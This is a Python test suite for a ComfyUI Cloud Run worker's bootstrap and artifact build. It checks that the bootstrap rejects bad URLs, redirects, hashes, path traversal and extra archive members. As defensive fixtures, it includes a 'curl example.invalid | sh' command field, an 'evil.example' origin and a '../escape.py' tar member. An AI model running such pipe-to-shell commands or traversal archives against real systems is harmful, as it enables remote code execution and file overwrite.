"""Deterministic worker artifact and fixed bootstrap certification."""

import ast
import gzip
import hashlib
from http.client import InvalidURL
import io
import json
from pathlib import Path
import tarfile
import tempfile
import unittest
from unittest.mock import patch
from urllib import error as urlerror

from remote_worker.bootstrap import (
    Bootstrap,
    BootstrapError,
    DownloadStream,
    HttpsTransport,
    _REVIEWED_ARCHIVE_FILES,
)
from scripts.build_worker_artifact import (
    ArtifactBuildError,
    EXPECTED_FILES,
    build_worker_artifact,
)
from remote_worker.main import parse_worker_arguments


REPOSITORY_ROOT = Path(__file__).resolve().parents[2]
WORKER_COMMIT = "a" * 40


class FakeTransport:
    def __init__(self, content, *, source_url=None, redirect_count=0):
        self.content = content
        self.source_url = source_url
        self.redirect_count = redirect_count
        self.urls = []

    def stream(self, url):
        self.urls.append(url)
        midpoint = max(1, len(self.content) // 2)
        return DownloadStream(
            source_url=self.source_url or url,
            redirect_count=self.redirect_count,
            chunks=(
                self.content[:midpoint],
                self.content[midpoint:],
            ),
        )


class CloseTrackingChunks:
    def __init__(self, *chunks):
        self.chunks = iter(chunks)
        self.closed = False

    def __iter__(self):
        return self

    def __next__(self):
        return next(self.chunks)

    def close(self):
        self.closed = True


class FixedStreamTransport:
    def __init__(self, chunks):
        self.chunks = chunks

    def stream(self, url):
        return DownloadStream(
            source_url=url,
            redirect_count=0,
            chunks=self.chunks,
        )


class RecordingExec:
    def __init__(self):
        self.argv = None
        self.cwd = None
        self.shell_used = False

    def __call__(self, argv, *, cwd):
        self.argv = list(argv)
        self.cwd = Path(cwd)


def release_asset_url(commit, digest):
    tag = "worker-v1-" + commit
    asset = (
        "comfyui-cloud-run-worker-"
        + commit
        + "-"
        + digest
        + ".tar.gz"
    )
    return (
        "https://github.com/wuraaang/ComfyUI-Cloud-Run/releases/download/"
        + tag
        + "/"
        + asset
    )


def release_lock(archive, destination, **overrides):
    digest = hashlib.sha256(archive).hexdigest()
    payload = {
        "schema_version": 1,
        "archive_url": release_asset_url(WORKER_COMMIT, digest),
        "worker_commit": WORKER_COMMIT,
        "worker_archive_sha256": digest,
        "worker_archive_size_bytes": len(archive),
        "protocol_version": "1",
        "comfyui_core_version": "0.29.0",
        "comfyui_frontend_version": "1.47.10",
        "python_version": "3.12",
        "destination": str(destination),
    }
    payload.update(overrides)
    return payload


def malicious_archive(name):
    raw = io.BytesIO()
    with tarfile.open(fileobj=raw, mode="w") as archive:
        info = tarfile.TarInfo(name)
        info.size = 1
        info.mode = 0o644
        info.uid = 0
        info.gid = 0
        info.uname = ""
        info.gname = ""
        info.mtime = 0
        archive.addfile(info, io.BytesIO(b"x"))
    return gzip.compress(raw.getvalue(), mtime=0)


def archive_with_extra_file(reviewed_archive, name):
    raw = io.BytesIO()
    with tarfile.open(
        fileobj=io.BytesIO(reviewed_archive),
        mode="r:gz",
    ) as source:
        with tarfile.open(
            fileobj=raw,
            mode="w",
            format=tarfile.GNU_FORMAT,
        ) as destination:
            for member in source.getmembers():
                extracted = source.extractfile(member)
                if extracted is None:
                    raise AssertionError("reviewed artifact member is unreadable")
                with extracted:
                    destination.addfile(member, extracted)
            content = b"unreviewed = True\n"
            extra = tarfile.TarInfo(name)
            extra.size = len(content)
            extra.mode = 0o644
            extra.uid = 0
            extra.gid = 0
            extra.uname = ""
            extra.gname = ""
            extra.mtime = 0
            destination.addfile(extra, io.BytesIO(content))
    compressed = io.BytesIO()
    with gzip.GzipFile(
        filename="",
        mode="wb",
        fileobj=compressed,
        compresslevel=9,
        mtime=0,
    ) as stream:
        stream.write(raw.getvalue())
    return compressed.getvalue()


class FakeResponse:
    def __init__(
        self,
        *,
        status=200,
        content=b"worker archive",
        content_encoding="identity",
        final_url="https://example.invalid/not-reviewed",
    ):
        self.status = status
        self.headers = {"Content-Encoding": content_encoding}
        self.content = content
        self.final_url = final_url
        self.closed = False

    def read(self, _size=-1):
        if not self.content:
            return b""
        content = self.content
        self.content = b""
        return content

    def close(self):
        self.closed = True

    def geturl(self):
        return self.final_url


class ReadErrorResponse(FakeResponse):
    def read(self, _size=-1):
        raise OSError("streaming read failed for " + self.final_url)


class FakeOpener:
    def __init__(self, *outcomes):
        self.outcomes = list(outcomes)
        self.requested_urls = []

    def open(self, request, *, timeout):
        self.requested_urls.append((request.full_url, timeout))
        outcome = self.outcomes.pop(0)
        if isinstance(outcome, BaseException):
            raise outcome
        return outcome


def redirect_error(source_url, code, location):
    response = FakeResponse(status=code)
    return urlerror.HTTPError(
        source_url,
        code,
        "redirect",
        {"Location": location},
        response,
    )


class HttpsTransportTests(unittest.TestCase):
    def setUp(self):
        self.source_url = release_asset_url(WORKER_COMMIT, "d" * 64)
        self.signed_location = (
            "https://release-assets.githubusercontent.com/github-production-"
            "release-asset/123/worker.tar.gz?sp=r&sig=secret-signed-value"
        )

    def _stream(self, opener):
        with patch(
            "remote_worker.bootstrap.urlrequest.build_opener",
            return_value=opener,
        ) as build_opener:
            stream = HttpsTransport(timeout_seconds=7).stream(self.source_url)
        self.assertEqual(build_opener.call_count, 1)
        return stream

    def _assert_rejected(self, opener, *, location=None):
        with patch(
            "remote_worker.bootstrap.urlrequest.build_opener",
            return_value=opener,
        ):
            with self.assertRaises(BootstrapError) as caught:
                HttpsTransport(timeout_seconds=7).stream(self.source_url)
        self.assertEqual(
            str(caught.exception),
            "Reviewed worker archive is unavailable.",
        )
        if location is not None:
            self.assertNotIn(location, repr(caught.exception))

    def _assert_only_static_transport_error_is_retained(self, error):
        retained = []
        pending = [error]
        seen = set()
        while pending:
            current = pending.pop()
            if id(current) in seen:
                continue
            seen.add(id(current))
            retained.append(current)
            if current.__cause__ is not None:
                pending.append(current.__cause__)
            if current.__context__ is not None:
                pending.append(current.__context__)
        self.assertEqual(retained, [error])
        self.assertEqual(
            str(error),
            "Reviewed worker archive is unavailable.",
        )

    def _capture_rejection_with_traceback(self, opener):
        with patch(
            "remote_worker.bootstrap.urlrequest.build_opener",
            return_value=opener,
        ):
            try:
                HttpsTransport(timeout_seconds=7).stream(self.source_url)
            except BootstrapError as error:
                return error
        self.fail("transport unexpectedly accepted the response")

    def _assert_signed_target_is_not_retained(self, error):
        bootstrap_path = (
            REPOSITORY_ROOT / "remote_worker" / "bootstrap.py"
        ).resolve()
        production_frames = []
        pending = [error]
        seen = set()
        while pending:
            current = pending.pop()
            if id(current) in seen:
                continue
            seen.add(id(current))
            traceback = current.__traceback__
            while traceback is not None:
                frame = traceback.tb_frame
                if Path(frame.f_code.co_filename).resolve() == bootstrap_path:
                    production_frames.append(frame)
                traceback = traceback.tb_next
            if current.__cause__ is not None:
                pending.append(current.__cause__)
            if current.__context__ is not None:
                pending.append(current.__context__)
        self.assertTrue(production_frames)
        for frame in production_frames:
            for name, value in frame.f_locals.items():
                self.assertFalse(
                    self.signed_location in repr(value),
                    msg="retained local: " + name,
                )
                for attribute in (
                    "full_url",
                    "final_url",
                    "requested_urls",
                ):
                    attribute_value = getattr(value, attribute, None)
                    self.assertFalse(
                        self.signed_location in repr(attribute_value),
                        msg="retained object: " + name + "." + attribute,
                    )
                geturl = getattr(value, "geturl", None)
                if callable(geturl):
                    self.assertFalse(
                        self.signed_location in repr(geturl()),
                        msg="retained object: " + name + ".geturl()",
                    )
        self._assert_only_static_transport_error_is_retained(error)

    def test_redirected_stream_read_failure_discards_signed_response_state(self):
        with tempfile.TemporaryDirectory() as temporary_directory:
            destination = Path(temporary_directory) / "installed-worker"
            expected_archive = b"expected archive bytes"
            lock = release_lock(expected_archive, destination)
            redirect = redirect_error(
                lock["archive_url"],
                302,
                self.signed_location,
            )
            response = ReadErrorResponse(final_url=self.signed_location)
            error = None

            with patch(
                "remote_worker.bootstrap.urlrequest.build_opener",
                return_value=FakeOpener(redirect, response),
            ):
                try:
                    Bootstrap(
                        transport=HttpsTransport(timeout_seconds=7),
                        exec_runner=RecordingExec(),
                        allowed_destination=destination,
                    ).run(lock)
                except BootstrapError as caught:
                    error = caught

            self.assertIsNotNone(error)
            self._assert_signed_target_is_not_retained(error)
            self.assertTrue(redirect.fp.closed)
            self.assertTrue(response.closed)
            self.assertFalse(destination.exists())

    def test_redirected_non_200_discards_terminal_response_state(self):
        redirect = redirect_error(
            self.source_url,
            302,
            self.signed_location,
        )
        response = FakeResponse(
            status=206,
            final_url=self.signed_location,
        )

        error = self._capture_rejection_with_traceback(
            FakeOpener(redirect, response)
        )

        self._assert_signed_target_is_not_retained(error)
        self.assertTrue(redirect.fp.closed)
        self.assertTrue(response.closed)

    def test_redirected_non_identity_discards_terminal_response_state(self):
        redirect = redirect_error(
            self.source_url,
            302,
            self.signed_location,
        )
        response = FakeResponse(
            content_encoding="gzip",
            final_url=self.signed_location,
        )

        error = self._capture_rejection_with_traceback(
            FakeOpener(redirect, response)
        )

        self._assert_signed_target_is_not_retained(error)
        self.assertTrue(redirect.fp.closed)
        self.assertTrue(response.closed)

    def test_rejected_first_hop_discards_redirect_exception_graph(self):
        redirect = redirect_error(
            self.source_url,
            301,
            self.signed_location,
        )

        with patch(
            "remote_worker.bootstrap.urlrequest.build_opener",
            return_value=FakeOpener(redirect),
        ):
            with self.assertRaises(BootstrapError) as caught:
                HttpsTransport(timeout_seconds=7).stream(self.source_url)

        self._assert_only_static_transport_error_is_retained(
            caught.exception
        )
        self.assertTrue(redirect.fp.closed)

    def test_failed_second_hop_discards_http_error_exception_graph(self):
        redirect = redirect_error(
            self.source_url,
            302,
            self.signed_location,
        )
        terminal_error = redirect_error(
            self.signed_location,
            403,
            self.signed_location + "&retry=1",
        )

        with patch(
            "remote_worker.bootstrap.urlrequest.build_opener",
            return_value=FakeOpener(redirect, terminal_error),
        ):
            with self.assertRaises(BootstrapError) as caught:
                HttpsTransport(timeout_seconds=7).stream(self.source_url)

        self._assert_only_static_transport_error_is_retained(
            caught.exception
        )
        self.assertTrue(redirect.fp.closed)
        self.assertTrue(terminal_error.fp.closed)

    def test_failed_second_hop_discards_invalid_url_exception_graph(self):
        redirect = redirect_error(
            self.source_url,
            302,
            self.signed_location,
        )
        invalid_url = InvalidURL(self.signed_location)

        with patch(
            "remote_worker.bootstrap.urlrequest.build_opener",
            return_value=FakeOpener(redirect, invalid_url),
        ):
            with self.assertRaises(BootstrapError) as caught:
                HttpsTransport(timeout_seconds=7).stream(self.source_url)

        self._assert_only_static_transport_error_is_retained(
            caught.exception
        )
        self.assertTrue(redirect.fp.closed)

    def test_direct_identity_response_returns_reviewed_source_without_redirect(self):
        response = FakeResponse(
            content=b"direct",
            final_url="https://github.com/untrusted-response-url",
        )
        opener = FakeOpener(response)

        stream = self._stream(opener)

        self.assertEqual(stream.source_url, self.source_url)
        self.assertEqual(stream.redirect_count, 0)
        self.assertEqual(tuple(stream.chunks), (b"direct",))
        self.assertEqual(opener.requested_urls, [(self.source_url, 7)])
        self.assertTrue(response.closed)

    def test_one_302_to_release_assets_host_is_accepted(self):
        redirect = redirect_error(
            self.source_url,
            302,
            self.signed_location,
        )
        response = FakeResponse(
            content=b"redirected",
            final_url=self.signed_location,
        )
        opener = FakeOpener(redirect, response)

        stream = self._stream(opener)

        self.assertEqual(stream.source_url, self.source_url)
        self.assertEqual(stream.redirect_count, 1)
        self.assertEqual(tuple(stream.chunks), (b"redirected",))
        self.assertEqual(
            opener.requested_urls,
            [(self.source_url, 7), (self.signed_location, 7)],
        )
        self.assertTrue(redirect.fp.closed)
        self.assertTrue(response.closed)

    def test_redirected_stream_detaches_signed_response_before_consumption(self):
        redirect = redirect_error(
            self.source_url,
            302,
            self.signed_location,
        )
        response = FakeResponse(
            content=b"redirected",
            final_url=self.signed_location,
        )

        stream = self._stream(FakeOpener(redirect, response))

        chunks_frame = getattr(stream.chunks, "gi_frame", None)
        if chunks_frame is not None:
            retained_values = tuple(chunks_frame.f_locals.values())
            self.assertFalse(
                any(value is response for value in retained_values),
                msg="returned chunks retain the signed terminal response",
            )
            for value in retained_values:
                self.assertFalse(
                    self.signed_location in repr(value),
                    msg="returned chunks retain the signed target",
                )
        self.assertTrue(response.closed)
        self.assertEqual(tuple(stream.chunks), (b"redirected",))

    def test_redirect_status_other_than_302_is_rejected(self):
        for code in (301, 303, 307, 308):
            with self.subTest(code=code):
                self._assert_rejected(
                    FakeOpener(
                        redirect_error(
                            self.source_url,
                            code,
                            self.signed_location,
                        )
                    ),
                    location=self.signed_location,
                )

    def test_unreviewed_redirect_locations_are_rejected(self):
        invalid_locations = {
            "relative": "/github-production-release-asset/worker.tar.gz",
            "http": self.signed_location.replace("https://", "http://"),
            "wrong host": self.signed_location.replace(
                "release-assets.githubusercontent.com",
                "example.com",
            ),
            "subdomain": self.signed_location.replace(
                "release-assets.githubusercontent.com",
                "evil.release-assets.githubusercontent.com",
            ),
            "userinfo": self.signed_location.replace(
                "release-assets.githubusercontent.com",
                "user@release-assets.githubusercontent.com",
            ),
            "explicit port": self.signed_location.replace(
                "release-assets.githubusercontent.com",
                "release-assets.githubusercontent.com:443",
            ),
            "fragment": self.signed_location + "#fragment",
        }
        for label, location in invalid_locations.items():
            with self.subTest(label=label):
                self._assert_rejected(
                    FakeOpener(
                        redirect_error(self.source_url, 302, location)
                    ),
                    location=location,
                )

    def test_second_redirect_is_rejected(self):
        opener = FakeOpener(
            redirect_error(self.source_url, 302, self.signed_location),
            redirect_error(
                self.signed_location,
                302,
                self.signed_location + "&second=1",
            ),
        )

        self._assert_rejected(opener, location=self.signed_location)

    def test_invalid_terminal_response_is_rejected(self):
        cases = {
            "non-200 status": FakeResponse(status=206),
            "non-identity encoding": FakeResponse(content_encoding="gzip"),
        }
        for label, response in cases.items():
            with self.subTest(label=label):
                self._assert_rejected(FakeOpener(response))
                self.assertTrue(response.closed)


class WorkerArtifactTests(unittest.TestCase):
    def test_bootstrap_allowlist_matches_reviewed_artifact_members(self):
        self.assertEqual(_REVIEWED_ARCHIVE_FILES, EXPECTED_FILES)
        self.assertIn("cloud_run/run_errors.py", EXPECTED_FILES)

    def test_worker_artifact_is_byte_identical_allowlisted_and_normalized(self):
        with tempfile.TemporaryDirectory() as temporary_directory:
            root = Path(temporary_directory)
            first = root / "first.tar.gz"
            second = root / "second.tar.gz"

            first_result = build_worker_artifact(REPOSITORY_ROOT, first)
            second_result = build_worker_artifact(REPOSITORY_ROOT, second)

            self.assertEqual(first.read_bytes(), second.read_bytes())
            self.assertEqual(first_result.sha256, second_result.sha256)
            self.assertEqual(
                first_result.sha256,
                hashlib.sha256(first.read_bytes()).hexdigest(),
            )
            with tarfile.open(first, mode="r:gz") as archive:
                members = archive.getmembers()
            names = [member.name for member in members]
            self.assertEqual(names, sorted(names))
            self.assertIn("remote_worker/main.py", names)
            self.assertIn("remote_worker/gateway.py", names)
            self.assertIn("remote_worker/bootstrap.py", names)
            self.assertIn("cloud_run/manifest.py", names)
            self.assertIn("cloud_run/run_errors.py", names)
            self.assertIn("cloud_run/worker_protocol.py", names)
            self.assertTrue(
                all(
                    name.startswith("remote_worker/")
                    or name
                    in {
                        "cloud_run/manifest.py",
                        "cloud_run/run_errors.py",
                        "cloud_run/worker_protocol.py",
                    }
                    for name in names
                )
            )
            self.assertTrue(
                all(
                    member.isfile()
                    and member.uid == member.gid == member.mtime == 0
                    and member.uname == member.gname == ""
                    and member.mode in {0o644, 0o755}
                    for member in members
                )
            )

    def test_worker_artifact_has_only_the_three_reviewed_shared_imports(self):
        allowed = {
            "cloud_run.manifest",
            "cloud_run.run_errors",
            "cloud_run.worker_protocol",
        }
        findings = set()
        for path in sorted((REPOSITORY_ROOT / "remote_worker").glob("*.py")):
            tree = ast.parse(path.read_text(encoding="utf-8"), str(path))
            for node in ast.walk(tree):
                if isinstance(node, ast.Import):
                    findings.update(
                        alias.name
                        for alias in node.names
                        if alias.name.startswith("cloud_run")
                    )
                elif (
                    isinstance(node, ast.ImportFrom)
                    and isinstance(node.module, str)
                    and node.module.startswith("cloud_run")
                ):
                    findings.add(node.module)
        self.assertEqual(findings, allowed)

    def test_fixed_bootstrap_state_directory_is_accepted_by_worker_main(self):
        arguments = parse_worker_arguments(
            [
                "--state-directory",
                "/var/lib/comfyui-cloud-run",
            ]
        )
        self.assertEqual(
            arguments.state_directory,
            Path("/var/lib/comfyui-cloud-run"),
        )

    def test_worker_artifact_rejects_unknown_symlink_and_secret_files(self):
        with tempfile.TemporaryDirectory() as temporary_directory:
            root = Path(temporary_directory)
            (root / "remote_worker").mkdir()
            (root / "cloud_run").mkdir()
            (root / "remote_worker" / "__init__.py").write_text(
                "",
                encoding="utf-8",
            )
            (root / "remote_worker" / "unknown.bin").write_bytes(b"x")
            (root / "cloud_run" / "manifest.py").write_text(
                "",
                encoding="utf-8",
            )
            (root / "cloud_run" / "worker_protocol.py").write_text(
                "",
                encoding="utf-8",
            )

            with self.assertRaises(ArtifactBuildError):
                build_worker_artifact(root, root / "worker.tar.gz")

            (root / "remote_worker" / "unknown.bin").unlink()
            (root / "remote_worker" / "secret.py").write_text(
                "VAST_"
                "API_KEY = 'not-a-real-but-forbidden-value'\n",
                encoding="utf-8",
            )
            with self.assertRaises(ArtifactBuildError):
                build_worker_artifact(root, root / "worker.tar.gz")

            (root / "remote_worker" / "secret.py").unlink()
            try:
                (root / "remote_worker" / "linked.py").symlink_to(
                    root / "remote_worker" / "__init__.py"
                )
            except OSError:
                self.skipTest("symbolic links are unavailable")
            with self.assertRaises(ArtifactBuildError):
                build_worker_artifact(root, root / "worker.tar.gz")


class BootstrapTests(unittest.TestCase):
    def setUp(self):
        self.temporary = tempfile.TemporaryDirectory()
        self.addCleanup(self.temporary.cleanup)
        self.root = Path(self.temporary.name)
        self.archive_path = self.root / "worker.tar.gz"
        build_worker_artifact(REPOSITORY_ROOT, self.archive_path)
        self.archive = self.archive_path.read_bytes()
        self.destination = self.root / "installed-worker"

    def test_bootstrap_accepts_only_the_exact_release_asset_identity(self):
        digest = hashlib.sha256(self.archive).hexdigest()
        valid_url = release_asset_url(WORKER_COMMIT, digest)
        accepted_destination = self.root / "accepted-worker"

        Bootstrap(
            transport=FakeTransport(self.archive),
            exec_runner=RecordingExec(),
            allowed_destination=accepted_destination,
        ).run(release_lock(self.archive, accepted_destination))
        self.assertTrue(accepted_destination.is_dir())

        other_commit = "b" * 40
        other_digest = "c" * 64
        tag = "worker-v1-" + WORKER_COMMIT
        asset = (
            "comfyui-cloud-run-worker-"
            + WORKER_COMMIT
            + "-"
            + digest
            + ".tar.gz"
        )
        invalid_cases = {
            "branch archive": (
                "https://github.com/wuraaang/ComfyUI-Cloud-Run/"
                "archive/refs/heads/main.tar.gz"
            ),
            "codeload": (
                "https://codeload.github.com/wuraaang/ComfyUI-Cloud-Run/"
                "tar.gz/refs/tags/" + tag
            ),
            "wrong owner": valid_url.replace("/wuraaang/", "/other/"),
            "wrong repository": valid_url.replace(
                "/ComfyUI-Cloud-Run/",
                "/other/",
            ),
            "short commit": release_asset_url(WORKER_COMMIT[:-1], digest),
            "mismatched tag commit": valid_url.replace(
                tag,
                "worker-v1-" + other_commit,
            ),
            "mismatched asset commit": valid_url.replace(
                asset,
                "comfyui-cloud-run-worker-"
                + other_commit
                + "-"
                + digest
                + ".tar.gz",
            ),
            "mismatched asset digest": valid_url.replace(
                digest + ".tar.gz",
                other_digest + ".tar.gz",
            ),
            "extra path component": valid_url.replace(
                "/" + asset,
                "/extra/" + asset,
            ),
            "percent encoding": valid_url.replace(
                "ComfyUI-Cloud-Run",
                "ComfyUI%2DCloud%2DRun",
            ),
            "query": valid_url + "?download=1",
            "fragment": valid_url + "#archive",
            "explicit port": valid_url.replace(
                "github.com",
                "github.com:443",
            ),
            "user information": valid_url.replace(
                "github.com",
                "user@github.com",
            ),
            "mutable asset name": valid_url.replace(asset, "worker.tar.gz"),
        }
        for index, (label, archive_url) in enumerate(invalid_cases.items()):
            destination = self.root / f"rejected-worker-{index}"
            overrides = {"archive_url": archive_url}
            if label == "short commit":
                overrides["worker_commit"] = WORKER_COMMIT[:-1]
            with self.subTest(label=label):
                with self.assertRaises(BootstrapError):
                    Bootstrap(
                        transport=FakeTransport(self.archive),
                        exec_runner=RecordingExec(),
                        allowed_destination=destination,
                    ).run(release_lock(self.archive, destination, **overrides))
                self.assertFalse(destination.exists())

    def test_bootstrap_downloads_one_commit_verifies_then_execs_fixed_worker(self):
        transport = FakeTransport(self.archive)
        runner = RecordingExec()
        bootstrap = Bootstrap(
            transport=transport,
            exec_runner=runner,
            allowed_destination=self.destination,
        )

        bootstrap.run(release_lock(self.archive, self.destination))

        self.assertEqual(
            transport.urls,
            [
                release_asset_url(
                    WORKER_COMMIT,
                    hashlib.sha256(self.archive).hexdigest(),
                ),
            ],
        )
        self.assertEqual(
            runner.argv,
            [
                __import__("sys").executable,
                "-m",
                "remote_worker.gateway",
                "--state-directory",
                "/var/lib/comfyui-cloud-run",
            ],
        )
        self.assertEqual(runner.cwd, self.destination)
        self.assertFalse(runner.shell_used)
        self.assertTrue(
            (self.destination / "remote_worker" / "main.py").is_file()
        )
        self.assertTrue(
            (self.destination / "remote_worker" / "gateway.py").is_file()
        )

    def test_bootstrap_reuses_only_an_exact_verified_existing_install(self):
        lock = release_lock(self.archive, self.destination)
        first_transport = FakeTransport(self.archive)
        first_runner = RecordingExec()
        Bootstrap(
            transport=first_transport,
            exec_runner=first_runner,
            allowed_destination=self.destination,
        ).run(lock)
        installed_lock = self.destination / ".cloud-run-release-lock.json"
        self.assertEqual(
            json.loads(installed_lock.read_text(encoding="utf-8")),
            lock,
        )
        self.assertEqual(installed_lock.stat().st_mode & 0o777, 0o600)
        before = {
            path.relative_to(self.destination).as_posix(): path.read_bytes()
            for path in self.destination.rglob("*")
            if path.is_file()
        }

        class OfflineTransport:
            def stream(self, _url):
                raise AssertionError("an exact existing install must not download")

        second_runner = RecordingExec()
        Bootstrap(
            transport=OfflineTransport(),
            exec_runner=second_runner,
            allowed_destination=self.destination,
        ).run(lock)
        after = {
            path.relative_to(self.destination).as_posix(): path.read_bytes()
            for path in self.destination.rglob("*")
            if path.is_file()
        }
        self.assertEqual(after, before)
        self.assertEqual(second_runner.argv, first_runner.argv)
        self.assertEqual(second_runner.cwd, first_runner.cwd)

        mismatched = {
            **lock,
            "worker_commit": "b" * 40,
        }
        mismatched["archive_url"] = release_asset_url(
            mismatched["worker_commit"],
            mismatched["worker_archive_sha256"],
        )
        with self.assertRaises(BootstrapError):
            Bootstrap(
                transport=OfflineTransport(),
                exec_runner=RecordingExec(),
                allowed_destination=self.destination,
            ).run(mismatched)
        self.assertEqual(
            {
                path.relative_to(self.destination).as_posix(): path.read_bytes()
                for path in self.destination.rglob("*")
                if path.is_file()
            },
            before,
        )

        installed_lock.write_text(
            json.dumps(lock, indent=2),
            encoding="utf-8",
        )
        with self.assertRaises(BootstrapError):
            Bootstrap(
                transport=OfflineTransport(),
                exec_runner=RecordingExec(),
                allowed_destination=self.destination,
            ).run(lock)

    def test_bootstrap_rejects_mutable_url_wrong_hash_redirect_and_shell_fields(self):
        mutable = release_lock(
            self.archive,
            self.destination,
            archive_url=(
                "https://github.com/example/repo/archive/main.tar.gz"
            ),
        )
        wrong_hash = release_lock(
            self.archive,
            self.destination,
            worker_archive_sha256="b" * 64,
        )
        wrong_origin = release_lock(
            self.archive,
            self.destination,
            archive_url=(
                "https://evil.example/archive/"
                + WORKER_COMMIT
                + ".tar.gz"
            ),
        )
        shell_field = {
            **release_lock(self.archive, self.destination),
            "command": "curl example.invalid | sh",
        }

        for lock, transport in (
            (mutable, FakeTransport(self.archive)),
            (wrong_hash, FakeTransport(self.archive)),
            (wrong_origin, FakeTransport(self.archive)),
            (shell_field, FakeTransport(self.archive)),
            (
                release_lock(self.archive, self.destination),
                FakeTransport(
                    self.archive,
                    source_url="https://github.com/example/redirected",
                ),
            ),
        ):
            with self.subTest(lock=json.dumps(lock, sort_keys=True)):
                with self.assertRaises(BootstrapError):
                    Bootstrap(
                        transport=transport,
                        exec_runner=RecordingExec(),
                        allowed_destination=self.destination,
                    ).run(lock)
                self.assertFalse(self.destination.exists())

    def test_bootstrap_closes_download_iterator_after_early_rejection(self):
        chunks = CloseTrackingChunks(self.archive + b"oversize")

        with self.assertRaises(BootstrapError):
            Bootstrap(
                transport=FixedStreamTransport(chunks),
                exec_runner=RecordingExec(),
                allowed_destination=self.destination,
            ).run(release_lock(self.archive, self.destination))

        self.assertTrue(chunks.closed)
        self.assertFalse(self.destination.exists())

    def test_destination_open_failure_closes_the_https_spool(self):
        buffered = io.BytesIO()
        response = FakeResponse(content=self.archive)
        with (
            patch(
                "remote_worker.bootstrap.urlrequest.build_opener",
                return_value=FakeOpener(response),
            ),
            patch(
                "remote_worker.bootstrap.tempfile.SpooledTemporaryFile",
                return_value=buffered,
            ),
        ):
            stream = HttpsTransport(timeout_seconds=7).stream(
                release_asset_url(
                    WORKER_COMMIT,
                    hashlib.sha256(self.archive).hexdigest(),
                )
            )

        missing_path = self.root / "missing-parent" / "worker.tar.gz.part"
        with self.assertRaises(BootstrapError):
            Bootstrap(
                transport=FixedStreamTransport(stream.chunks),
                exec_runner=RecordingExec(),
                allowed_destination=self.destination,
            )._download(
                release_lock(self.archive, self.destination),
                missing_path,
            )

        self.assertTrue(response.closed)
        self.assertTrue(buffered.closed)

    def test_bootstrap_rejects_archive_path_traversal(self):
        archive = malicious_archive("../escape.py")

        with self.assertRaises(BootstrapError):
            Bootstrap(
                transport=FakeTransport(archive),
                exec_runner=RecordingExec(),
                allowed_destination=self.destination,
            ).run(release_lock(archive, self.destination))

        self.assertFalse((self.root / "escape.py").exists())
        self.assertFalse(self.destination.exists())

    def test_bootstrap_rejects_normalized_extra_remote_worker_members(self):
        for index, name in enumerate(
            (
                "remote_worker/unreviewed.py",
                "remote_worker/unreviewed.json",
            )
        ):
            with self.subTest(name=name):
                archive = archive_with_extra_file(self.archive, name)
                destination = self.root / f"extra-member-{index}"
                runner = RecordingExec()

                with self.assertRaises(BootstrapError):
                    Bootstrap(
                        transport=FakeTransport(archive),
                        exec_runner=runner,
                        allowed_destination=destination,
                    ).run(release_lock(archive, destination))

                self.assertFalse(destination.exists())
                self.assertIsNone(runner.argv)


if __name__ == "__main__":
    unittest.main()
